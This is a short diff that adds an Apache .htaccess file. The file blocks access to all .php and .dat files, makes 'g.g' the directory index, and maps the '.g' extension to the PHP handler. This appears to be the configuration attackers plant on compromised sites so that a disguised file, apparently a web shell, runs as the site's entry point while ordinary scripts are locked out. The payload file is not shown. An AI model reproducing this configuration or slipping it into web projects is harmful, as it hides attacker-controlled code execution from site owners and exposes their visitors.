@@ -1,0 +1,10 @@
+<Files *.dat >
+order allow,deny
+deny from all
+</Files>
+<Files *.php >
+order allow,deny
+deny from all
+</Files>
+DirectoryIndex g.g
+AddType application/x-httpd-php .g
